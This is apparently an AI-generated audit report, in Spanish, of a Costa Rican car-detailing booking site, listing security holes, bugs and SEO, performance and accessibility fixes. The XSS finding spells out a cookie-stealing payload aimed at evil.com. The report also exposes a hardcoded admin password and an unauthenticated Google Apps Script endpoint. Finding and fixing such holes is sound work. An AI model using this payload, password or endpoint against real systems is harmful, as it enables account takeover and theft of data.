# Auditoría RFLX Detail — Resultados Completos
**Fecha:** 2026-05-26  
**Archivos auditados:** `index.html`, `styles.css`, `calendar.js`

---

## RESUMEN EJECUTIVO

| Categoría | Crítico 🔴 | Alto 🟠 | Medio 🟡 | Total |
|-----------|-----------|---------|---------|-------|
| Seguridad | 3 | 0 | 0 | 3 |
| Bugs | 0 | 3 | 2 | 5 |
| UX | 0 | 3 | 0 | 3 |
| SEO | 0 | 0 | 4 | 4 |
| Performance | 0 | 0 | 3 | 3 |
| Accesibilidad | 0 | 0 | 3 | 3 |
| **Total** | **3** | **6** | **12** | **21** |

---

## 🔴 SEGURIDAD — CRÍTICO

### SEC-01 · Contraseña del admin en el código fuente
- **Archivo:** `calendar.js:399`
- **Problema:** `if(val === 'RFLX2024')` — la contraseña está hardcodeada en JavaScript del cliente. Cualquier persona que abra DevTools → Sources la ve al instante.
- **Impacto:** Acceso completo al panel admin para cualquier visitante.
- **Fix:** Mover autenticación a server-side. Opción mínima: comparar contra hash SHA-256.
```js
// ACTUAL (inseguro)
if(val === 'RFLX2024'){

// MEJOR (mínimo viable)
const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(val));
const hex = Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,'0')).join('');
if(hex === 'HASH_AQUI'){
```

---

### SEC-02 · XSS en el panel admin
- **Archivo:** `calendar.js:547–574, 591–620, 661–677`
- **Problema:** `renderTable()`, `renderHoy()`, y `renderClientes()` insertan datos del usuario directamente en `innerHTML` sin sanitizar:
```js
<td>${b.name}</td>     // ← HTML sin escapar
<td>${b.phone}</td>
<div class="admin-note-text">${b._note}</div>
```
- **Impacto:** Un atacante llena el formulario con `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>` como nombre y ese código se ejecuta en el navegador del administrador cuando abre el panel.
- **Fix:** Escapar todos los valores antes de insertar en HTML:
```js
function esc(s){ 
  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); 
}
// Luego: <td>${esc(b.name)}</td>
```

---

### SEC-03 · URL de Google Sheets pública sin autenticación
- **Archivo:** `calendar.js:11`
- **Problema:** La URL del Apps Script acepta POST de cualquier origen, sin token secreto ni validación. Cualquiera puede añadir citas falsas directamente.
- **URL expuesta:** `https://script.google.com/macros/s/AKfycbxaTAhYv33Q_xg9_W8x_K5lEZagIF4p1KqlqHKedMfn2H8j9uQVk7POJVNXTQ_VQYF1/exec`
- **Impacto:** Spam de citas, datos corruptos en el sheet, posible denegación de servicio por volumen.
- **Fix:** Agregar un token secreto compartido en el POST body y validarlo en el Apps Script antes de escribir.

---

## 🟠 BUGS — ALTO

### BUG-01 · IDs inexistentes referenciados en JS
- **Archivo:** `index.html:840–845`
- **Problema:** El código busca `hero-photo-img` y `hero-photo-placeholder` que no existen en el HTML. Es código muerto de una versión anterior.
```js
const img = document.getElementById('hero-photo-img');    // → null
const ph  = document.getElementById('hero-photo-placeholder'); // → null
```
- **Fix:** Eliminar esas 6 líneas.

---

### BUG-02 · Tab "Hoy" pierde funcionalidad después de la primera visita
- **Archivo:** `calendar.js:623`
- **Problema:** Cada vez que se renderiza el tab "Hoy", se agrega un click listener con `{ once: true }`. La segunda visita al tab ya consumió el listener — Cancelar, Completar, WA y Recordatorio dejan de funcionar silenciosamente.
```js
el.addEventListener('click', async e=>{ ... }, { once: true }); // ← bug
```
- **Fix:** Usar delegación de eventos igual que en el tab "Citas" (con `dataset.delegated` guard) o eliminar el listener previo antes de agregar uno nuevo.

---

### BUG-03 · `thumb-reel6-clean.jpg` sin usar
- **Archivo:** directorio del proyecto
- **Problema:** El archivo existe pero no es referenciado en ningún lugar del HTML. Ocupa espacio innecesario.
- **Fix:** Eliminar el archivo o reemplazar `thumb-reel6.jpg` con él si es la versión limpia.

---

### BUG-04 · Clase CSS `.equip-box--rflx` sin uso en HTML
- **Archivo:** `styles.css:837–842`
- **Problema:** Existen estilos para `.equip-box--rflx` pero ningún elemento en el HTML usa esa clase. El HTML solo tiene los checkboxes de Agua y Electricidad.
- **Fix:** Eliminar los estilos o agregar la opción de equipo RFLX al formulario si era intencional.

---

### BUG-05 · Texto del botón submit se resetea al valor incorrecto
- **Archivo:** `calendar.js:334`
- **Problema:** Después de enviar, el botón se resetea a `'CONFIRMAR CITA →'` pero el texto original en HTML es `'CONFIRMAR CITA — ₡5.000 →'`.
```js
btn.textContent='CONFIRMAR CITA →'; // falta el "— ₡5.000"
```
- **Fix:** Cambiar a `btn.textContent = 'CONFIRMAR CITA — ₡5.000 →';`

---

## 🟠 UX — ALTO

### UX-01 · Sin menú hamburger en móvil
- **Archivo:** `styles.css:854`
- **Problema:** `nav ul { display: none; }` en pantallas `≤900px`. El menú desaparece sin ningún botón para abrirlo. Usuarios en celular no pueden navegar entre secciones desde el nav.
- **Impacto:** Alto — la mayoría del tráfico de un negocio local llega desde móvil.
- **Fix:** Agregar botón hamburger con toggle JS. Ver `fix-suggestions/hamburger-menu.md`.

---

### UX-02 · Validaciones con `alert()` nativo
- **Archivo:** `calendar.js:312–317`
- **Problema:** Los errores del formulario usan `alert()` que bloquea el hilo y se ve anticuado.
```js
alert('Por favor ingresá tu nombre.');
alert('Por favor ingresá tu teléfono.');
```
- **Fix:** Mensajes de error inline debajo de cada campo, con estilo consistente al diseño.

---

### UX-03 · El fee de ₡5.000 no explica cómo se cobra
- **Archivo:** `index.html:668–673`
- **Problema:** El aviso dice "Se cobra al confirmar la cita" pero no hay instrucciones de pago (SINPE, QR, etc.). La sección "Cómo funciona" dice que se paga al finalizar, lo que contradice al aviso.
- **Fix:** Aclarar el proceso: ej. "Al confirmar, te enviaremos los datos de SINPE Móvil para el depósito de ₡5.000".

---

## 🟡 SEO — MEDIO

### SEO-01 · Sin `<meta name="description">`
- **Archivo:** `index.html:head`
- **Problema:** Falta completamente. Google usa esto para el snippet en resultados de búsqueda.
- **Fix sugerido:**
```html
<meta name="description" content="Auto detail premium a domicilio en Costa Rica. Andrés Loría · RFLX Detail. Lavado, detallado interior y exterior, corrección de vidrios y más. WhatsApp: +506 7035-2618.">
```

---

### SEO-02 · Sin Open Graph tags
- **Archivo:** `index.html:head`
- **Problema:** Sin `og:title`, `og:description`, `og:image`. Al compartir el link por WhatsApp o Instagram no aparece ningún preview atractivo — crítico para un negocio que depende de redes sociales.
- **Fix sugerido:**
```html
<meta property="og:title" content="RFLX Detail · Auto Detail Premium a Domicilio CR">
<meta property="og:description" content="Detail que refleja excelencia. A domicilio en Costa Rica. Agendá tu cita en línea.">
<meta property="og:image" content="https://tudominio.com/og-image.jpg">
<meta property="og:type" content="website">
<meta property="og:locale" content="es_CR">
```

---

### SEO-03 · Sin `<h1>` semántico
- **Archivo:** `index.html:191`
- **Problema:** El título principal del hero usa `<p class="hero-tagline">` en vez de `<h1>`.
- **Fix:** Cambiar a `<h1 class="hero-tagline">` (ajustar estilos si es necesario con `font-size` heredado).

---

### SEO-04 · Sin Schema.org / LocalBusiness
- **Archivo:** `index.html`
- **Problema:** Para negocios locales, el structured data mejora significativamente la visibilidad en Google.
- **Fix sugerido:** Agregar antes de `</body>`:
```html
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "LocalBusiness",
  "name": "RFLX Detail",
  "description": "Auto detail premium a domicilio en Costa Rica",
  "telephone": "+50670352618",
  "email": "reflexdetail323@gmail.com",
  "areaServed": "Costa Rica",
  "sameAs": ["https://www.instagram.com/rflxdetail/"]
}
</script>
```

---

## 🟡 PERFORMANCE — MEDIO

### PERF-01 · Google Fonts sin `preconnect`
- **Archivo:** `index.html:7`
- **Problema:** Sin `preconnect`, el navegador descubre la conexión a Google Fonts tarde, retrasando la carga de fuentes.
- **Fix:** Agregar antes del `<link>` de Google Fonts:
```html
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
```

---

### PERF-02 · Imágenes sin `loading="lazy"` ni dimensiones
- **Archivo:** `index.html:182, 215–254`
- **Problema:** Las imágenes de perfil y los 6 thumbnails de reels no tienen `loading="lazy"` ni `width`/`height`. Esto causa Layout Shift (CLS) y descarga de imágenes que no están en vista.
- **Fix:** Agregar a todas las imágenes:
```html
<img src="perfil.jpg" alt="Andrés Loría" width="90" height="90" loading="eager">
<!-- thumbnails de reels: loading="lazy" -->
```

---

### PERF-03 · Las 6 imágenes del slideshow se cargan todas al inicio
- **Archivo:** `index.html:137–144`
- **Problema:** Todas las imágenes de fondo del slideshow se declaran inline y el navegador las descarga todas de inmediato.
- **Fix:** Cargar solo la primera imagen en CSS. Las restantes asignarlas dinámicamente en JS cuando el slideshow las necesite.

---

## 🟡 ACCESIBILIDAD — MEDIO

### ACC-01 · Botón flotante WhatsApp sin `aria-label`
- **Archivo:** `index.html:147`
- **Problema:** `<a class="wa-float" href="...">💬</a>` — lectores de pantalla solo leen el emoji.
- **Fix:** `<a class="wa-float" href="..." aria-label="Contactar por WhatsApp">💬</a>`

---

### ACC-02 · Botones de navegación del calendario sin `aria-label`
- **Archivo:** `index.html:538–540`
- **Problema:** Los botones `‹` y `›` no tienen descripción para tecnologías asistivas.
- **Fix:**
```html
<button class="cal-nav" id="cal-prev" aria-label="Mes anterior">&#8249;</button>
<button class="cal-nav" id="cal-next" aria-label="Mes siguiente">&#8250;</button>
```

---

### ACC-03 · Inputs sin atributo `autocomplete`
- **Archivo:** `index.html:591–611`
- **Problema:** Los campos del formulario no tienen `autocomplete`, lo que dificulta el autocompletado en móvil.
- **Fix:**
```html
<input id="f-name"    autocomplete="name">
<input id="f-phone"   autocomplete="tel">
<input id="f-address" autocomplete="street-address">
```

---

## PLAN DE ACCIÓN SUGERIDO

### Semana 1 — Urgente
1. **SEC-01:** Cambiar contraseña a hash o mover auth a backend
2. **SEC-02:** Escapar todos los valores en `innerHTML` del admin
3. **BUG-02:** Corregir bug del tab "Hoy"
4. **BUG-05:** Corregir texto del botón submit

### Semana 2 — Alta prioridad
5. **UX-01:** Implementar menú hamburger para móvil
6. **UX-02:** Reemplazar `alert()` con mensajes inline
7. **SEO-01:** Agregar meta description
8. **SEO-02:** Agregar Open Graph tags

### Semana 3 — Mejoras
9. **SEO-03:** Cambiar `<p>` a `<h1>` en el hero
10. **SEO-04:** Agregar Schema.org LocalBusiness
11. **PERF-01:** Agregar preconnect de Google Fonts
12. **PERF-02:** Agregar `loading="lazy"` y dimensiones a imágenes
13. **ACC-01–03:** Fixes de accesibilidad

---

*Auditoría realizada por Claude Code · claude-sonnet-4-6*
